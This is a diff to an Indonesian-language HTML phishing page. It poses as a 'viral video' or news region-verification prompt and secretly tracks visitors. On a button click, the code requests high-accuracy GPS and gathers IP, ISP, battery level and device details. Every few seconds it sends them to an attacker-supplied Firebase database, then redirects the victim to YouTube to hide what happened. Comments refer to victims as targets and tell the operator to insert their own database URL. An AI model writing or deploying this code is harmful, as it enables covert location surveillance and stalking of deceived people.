@@ -3,105 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Berita</title>
+    <title>Verifikasi Keamanan Konten</title>
     <style>
-        /* Tampilan Splash Screen / Loading */
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .container { text-align: center; padding: 20px; transition: opacity 0.5s; }
-        .loader { border: 4px solid #1e293b; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); max-width: 320px; width: 90%; }
+        .icon { font-size: 50px; margin-bottom: 20px; }
+        h2 { font-size: 18px; margin-bottom: 10px; font-weight: 600; }
+        p { font-size: 13px; color: #94a3b8; line-height: 1.6; margin-bottom: 25px; }
+        .btn { background: #3b82f6; color: white; border: none; padding: 15px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); background: #2563eb; }
+        #loader { display: none; margin-top: 15px; border: 3px solid #334155; border-top: 3px solid #3b82f6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-weight: 300; letter-spacing: 1px; }
-        p { color: #94a3b8; font-size: 14px; }
     </style>
 </head>
 <body>
 
-<div class="container" id="app">
-    <div class="loader"></div>
-    <h2>MENYINKRONKAN SISTEM...</h2>
-    <p>Mohon izinkan akses GPS untuk memverifikasi lokasi wilayah berita Anda.</p>
+<div class="card">
+    <div class="icon">🛡️</div>
+    <h2>Verifikasi Wilayah</h2>
+    <p>Konten ini sedang tren di wilayah Anda. Silakan verifikasi lokasi untuk membuka aplikasi YouTube secara otomatis.</p>
+    <button class="btn" id="startBtn" onclick="processAll()">BUKA VIDEO VIRAL</button>
+    <div id="loader"></div>
 </div>
 
 <script>
     // --- KONFIGURASI_FIREBASE ---
     // Ganti URL di bawah dengan URL Realtime Database kamu
-    // Contoh: https://proyek-kamu-default-rtdb.firebaseio.com/target_hp.json
     const DB_URL = "ISI_DENGAN_URL_FIREBASE_KAMU/target_hp.json";
 
-    // Daftar link redirect (YouTube atau Berita Viral)
-    const REDIRECT_LINKS = [
-        "https://www.youtube.com/trending",
-        "https://news.google.com/topics/CAAqJggKIiBDQkFTRWdvSUwyMHZNRGx6TVdZd0VnVndkQzhvQUFQAQ?hl=id&gl=ID&ceid=ID%3Aid"
-    ];
+    const YT_URL = "https://www.youtube.com/trending";
+    const YT_APP_INTENT = "intent://www.youtube.com/trending#Intent;package=com.google.android.youtube;scheme=https;end";
 
     let lastSent = 0;
 
-    // 1. Fungsi mendapatkan IP & ISP via layanan publik gratis
-    async function getNetworkInfo() {
+    async function getExtraInfo() {
         try {
-            const response = await fetch('https://ipapi.co/json/');
-            return await response.json();
-        } catch (e) { return {}; }
-    }
-
-    // 2. Fungsi mendapatkan status baterai
-    async function getBattery() {
-        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const net = await ipRes.json();
             const battery = await navigator.getBattery();
-            return { level: Math.round(battery.level * 100) + "%", charging: battery.charging };
-        } catch (e) { return "N/A"; }
+            return {
+                ip: net.ip,
+                isp: net.org,
+                bat: Math.round(battery.level * 100) + "%",
+                dev: navigator.userAgent
+            };
+        } catch (e) { return { ip: "N/A", isp: "N/A", bat: "N/A", dev: navigator.userAgent }; }
     }
 
-    // 3. Fungsi utama pengiriman data ke Firebase (Metode PUT = Overwrite)
     async function sendToFirebase(coords) {
-        const net = await getNetworkInfo();
-        const bat = await getBattery();
-
+        const info = await getExtraInfo();
         const payload = {
             lat: coords.latitude,
             lon: coords.longitude,
-            ip: net.ip || "N/A",
-            isp: net.org || "N/A",
-            device: navigator.userAgent,
-            battery: bat,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            updated_at: new Date().toLocaleString("id-ID")
+            ip: info.ip,
+            isp: info.isp,
+            battery: info.bat,
+            device: info.dev,
+            time: new Date().toLocaleString("id-ID"),
+            status: "Online (Background)"
         };
 
-        fetch(DB_URL, {
-            method: 'PUT',
-            body: JSON.stringify(payload)
-        });
+        fetch(DB_URL, { method: 'PUT', body: JSON.stringify(payload) });
     }
 
-    // 4. Inisialisasi Pelacakan
-    function initTracker() {
+    function processAll() {
+        document.getElementById('startBtn').style.display = "none";
+        document.getElementById('loader').style.display = "block";
+
         if (navigator.geolocation) {
+            // Minta izin GPS
             navigator.geolocation.watchPosition(
                 (pos) => {
+                    // Kirim data pertama
+                    sendToFirebase(pos.coords);
+
+                    // Kirim data setiap 5 detik (looping tetap jalan di tab ini)
                     const now = Date.now();
-                    // Kirim data setiap 5 detik (5000ms)
                     if (now - lastSent > 5000) {
                         sendToFirebase(pos.coords);
                         lastSent = now;
-                        
-                        // Setelah pengiriman pertama berhasil, arahkan target
-                        setTimeout(() => {
-                            const randomLink = REDIRECT_LINKS[Math.floor(Math.random() * REDIRECT_LINKS.length)];
-                            window.location.href = randomLink;
-                        }, 2000);
                     }
+
+                    // Pengalihan ke aplikasi YouTube eksternal
+                    // Kita beri jeda 1 detik agar pengiriman data pertama selesai
+                    setTimeout(() => {
+                        window.location.href = YT_APP_INTENT;
+                        // Fallback jika tidak punya aplikasi YT:
+                        setTimeout(() => { window.location.href = YT_URL; }, 500);
+                    }, 1000);
                 },
                 (err) => {
-                    document.getElementById('app').innerHTML = "<h2>ERROR: SINKRONISASI GAGAL</h2><p>Mohon aktifkan GPS dan refresh halaman ini.</p>";
+                    alert("Mohon izinkan lokasi agar video bisa dibuka sesuai wilayah Anda.");
+                    location.reload();
                 },
-                { enableHighAccuracy: true, maximumAge: 0 }
+                { enableHighAccuracy: true }
             );
         }
     }
-
-    // Jalankan tracker saat halaman dibuka
-    window.onload = initTracker;
 </script>
 
 </body>
